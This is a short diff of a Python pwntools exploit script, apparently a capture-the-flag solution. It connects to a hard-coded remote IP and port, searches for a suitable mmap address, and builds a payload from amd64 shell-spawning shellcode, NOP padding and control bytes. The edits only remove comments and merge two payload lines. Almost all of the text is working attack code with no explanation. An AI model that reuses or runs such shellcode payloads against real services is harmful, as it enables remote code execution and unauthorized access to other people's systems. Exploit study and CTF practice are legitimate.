@@ -21,14 +21,11 @@ def beer(io):
 def solve():
     info("Starting")
 
-    # io = process('./vuln', shell=True, level='error')
-    # io = remote("192.168.44.128", 65432)
     io = remote("116.203.18.177", 65432)
 
     try:
         while 1:
             mmap = beer(io)
-            # print mmap
             if mmap == GOOD_MMAP:
                 break
 
@@ -37,8 +34,7 @@ def solve():
 
         info('mmap: {}'.format(hex(mmap)))
 
-        payload = ''
-        payload += str(asm(shellcraft.amd64.sh(), arch='amd64'))
+        payload = str(asm(shellcraft.amd64.sh(), arch='amd64'))
         payload += '\x90' * (512 - len(payload))
         payload += '\x98\xff'
         payload += '\x90' * (0xf7f - len(payload))
